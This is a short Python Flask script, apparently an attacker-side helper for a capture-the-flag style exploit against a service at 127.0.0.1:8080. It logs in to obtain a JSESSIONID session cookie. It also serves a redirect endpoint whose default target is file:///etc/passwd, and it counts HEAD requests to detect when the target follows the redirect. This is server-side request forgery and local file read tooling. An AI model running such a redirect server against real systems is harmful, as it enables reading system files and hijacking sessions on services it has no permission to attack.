from flask import Flask, Response, request, redirect, send_file
app = Flask(__name__)
import requests

HOST = "http://127.0.0.1:8080"

@app.route('/session')
def create_session():
    username = request.args.get("username", default="a", type=str)
    s = requests.Session()
    s.get(f'{HOST}/')
    s.post(f'{HOST}/login', json={"username": username, "password": "asdf"})
    # get 'JSESSIONID' cookie
    return s.cookies.get_dict().get('JSESSIONID')

counter = 0

@app.route('/redirect', methods=["GET", "POST", "HEAD"])
def redir():
    global counter
    if request.method == "HEAD":
        counter += 1

    url = request.args.get("url", default="file:///etc/passwd")
    return redirect(url, code=302)

@app.route('/counter')
def ctr():
    global counter
    ret = str(counter)
    counter = 0
    return ret


@app.route('/')
def index():
    return send_file("index.html")


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, threaded=True)
